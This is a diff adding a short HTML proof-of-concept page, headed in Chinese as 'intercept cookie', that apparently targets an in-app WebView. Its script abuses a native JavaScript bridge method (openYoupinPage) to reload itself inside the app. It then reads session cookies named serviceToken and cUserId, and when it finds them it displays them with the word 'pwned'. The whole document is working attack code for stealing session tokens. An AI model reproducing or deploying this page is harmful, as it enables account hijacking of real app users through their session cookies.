@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading</title></head>
+<body>
+<h3 id="st">截取cookie</h3>
+<pre id="tk" style="white-space:pre-wrap;word-break:break-all;font-size:13px;text-align:left"></pre>
+<script>
+var grab = /[?&]grab=1/.test(location.search);
+var n = 0;
+(function poll() {
+    var c = document.cookie;
+    if (/(serviceToken|cUserId)=/.test(c)) {
+        document.getElementById('st').textContent = 'pwned';
+        document.getElementById('tk').textContent = c;
+        return;
+    }
+    if (n++ === 0 && !grab && window._native_interface && window._native_interface.openYoupinPage) {
+        window._native_interface.openYoupinPage(location.origin + location.pathname + '?grab=1');
+    }
+    if (n < 120) setTimeout(poll, 500);
+})();
+</script>
+</body>
+</html>
